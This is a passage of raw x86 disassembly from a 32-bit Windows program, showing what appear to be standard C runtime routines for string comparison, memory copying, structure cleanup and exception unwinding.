  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
